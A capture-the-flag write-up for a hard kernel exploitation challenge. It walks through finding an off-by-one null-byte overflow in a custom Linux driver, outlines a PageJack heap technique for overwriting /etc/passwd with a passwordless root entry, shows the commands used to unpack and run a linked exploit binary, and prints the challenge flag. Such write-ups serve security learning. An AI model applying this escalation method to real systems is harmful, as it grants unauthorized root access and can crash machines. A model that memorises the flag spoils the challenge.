# IO HO FIRM 2.0

[Español](README.md) | [English](README.en.md)

**Challenge 9 · Exploiting · Difficulty: Hard**

## Description

> Deep within the headquarters of IO_HO_FIRM, engineers proudly unveiled the latest version of their proprietary operating platform: IO_HO_FIRM 2.0. Marketed as a revolutionary advancement in secure infrastructure management, the firmware was designed to protect the company's most sensitive assets, from internal credentials to classified research files. Employees were assured that even if an attacker managed to gain access to the system, multiple layers of isolation would prevent any significant compromise.
>
> However, hidden within a custom driver included as part of the firmware was a subtle implementation flaw.
>
> By carefully studying the custom driver and manipulating the system's internal behavior, you discovered a way to influence components that were never meant to be accessible to ordinary users.
>
> One step led to another as trusted structures were silently reshaped and access controls gradually lost their authority. Files that should have remained protected became writable, restrictions dissolved, and identities once reserved for administrators could be assumed at will.
>
> Eventually, the path led to a locked file buried deep within the company's servers.
>
> Everything can be found through the connection below. Retrieve the confidential file before another attacker steals and abuses this vulnerability!

***Note:** The instance restarts every 20 minutes.*

**Connection:**

```
nc ch4ll3ng3s.hackrocks.com 6767
```

## Flag

```
p4g3j4ck_h1ts_d1ff
```

## Solution

Connecting to the service provides access to a Linux terminal. To identify the environment, the following commands are executed:

```
id
uname -a
ls -la /dev
ls -la /
```

The system is found to be running Linux kernel `6.13.0`, and the session belongs to the unprivileged user `ctf`.

```
uid=1000(ctf) gid=1000 groups=1000
Linux (none) 6.13.0 #3 x86_64 GNU/Linux
```

Among the available files and devices, the following stand out:

```
/dev/ioho_kd
/ioho_kd.ko
/flag
```

The `/flag` file belongs to `root` and has `600` permissions, meaning it cannot be read from the current account.

However, the `/dev/ioho_kd` device has `666` permissions, allowing an unprivileged user to interact with the kernel driver.

The `ioho_kd.ko` file corresponds to the vulnerable module. Tools such as the following are used to analyze it:

```
readelf -sW ioho_kd.ko
objdump -drwC -Mintel ioho_kd.ko
```

The disassembly reveals two `ioctl` operations:

| Operation | Function                             |
| --------- | ------------------------------------ |
| `0xF000`  | Allocates a 1024-byte block          |
| `0xF001`  | Copies data into the allocated block |

The vulnerability is located in the second operation.

The driver allows copying up to `0x400` bytes, but then writes a null byte at the position specified by the size.

Its behavior can be represented by the following pseudocode:

```
copy_from_user(obj, buffer, size);
obj[size] = '\0';
```

When `size = 0x400`, the following write occurs:

```
obj[0x400] = '\0';
```

However, a 1024-byte buffer only supports positions between `0` and `0x3FF`.

This causes a byte to be written outside the buffer boundaries, resulting in an **Off-by-One NULL Byte Overflow**.

To exploit this vulnerability, a technique known as **PageJack** is used, which focuses on manipulating internal kernel structures through memory corruption.

The applied strategy consists of:

1. Prepare the kernel heap using `kmalloc-1024` objects.
2. Allocate a block using `ioctl(0xF000)`.
3. Execute `ioctl(0xF001)` with a size of `0x400` to trigger the overflow.
4. Exploit the corruption of pipe-related structures to manipulate a memory page.
5. Reuse that page as part of a `struct file` structure associated with `/etc/passwd`.
6. Modify `/etc/passwd` to allow access to the `root` account without a password.

The entry used for the final step is:

```
root::0:0:root:/root:/bin/sh
```

Once `/etc/passwd` has been modified, `su` can be used to execute commands with administrator privileges and access the `/flag` file.

The executable [`ioho_exploit_v3`](./ioho_exploit_v3), provided by GPT, is used to perform the exploitation.

Since the environment does not have an accessible compiler, the executable is transferred using **Base64 and gzip** encoding.

The complete transfer payload is available in [`exploit_v3_transferencia.sh`](./exploit_v3_transferencia.sh).

Once the Base64 content has been transferred to `/tmp/v3.b64`, the executable is reconstructed:

```
busybox base64 -d /tmp/v3.b64 | busybox gzip -dc > /tmp/ioho_v3
```

The file is verified to contain 9944 bytes:

```
wc -c /tmp/ioho_v3
```

Finally, execution permissions are granted and the executable is run:

```
chmod +x /tmp/ioho_v3
/tmp/ioho_v3
```

The following output is obtained:

```
[*] Preparando heap kmalloc-1024...
[*] ioctl ALLOC: 0
[*] Activando el null-byte overflow...
[*] ioctl WRITE: 0

[+] pipe corrupto: 80
[+] identificador de la pagina compartida: 79

[*] Liberando pagina compartida...
[*] Reutilizando pagina como struct file para /etc/passwd...

[*] archivos abiertos: 640
[*] escrituras via pipe: 4

[+] /etc/passwd modificado usando descriptor 10
```

The exploit messages indicate that both `ioctl` operations completed successfully and that `/etc/passwd` was modified.

After modifying `/etc/passwd`, the exploit attempts to use `su` to access the protected file.

The recorded output is:

```
[+] Intentando leer flag inmediatamente con su...

p4g3j4ck_h1ts_d1ff
```

This successfully retrieves the challenge flag.

However, a kernel error occurs immediately afterward:

```
kernel tried to execute NX-protected page - exploit attempt? (uid: 0)

Kernel panic - not syncing: Fatal exception in interrupt
```

This happens because memory corruption leaves internal kernel structures in an inconsistent state.

Although the exploit is unstable and eventually causes a *kernel panic*, the flag was successfully retrieved before the system crashed.

## Conclusion

A single-byte out-of-bounds write can compromise the security of an entire system when it occurs within the kernel.
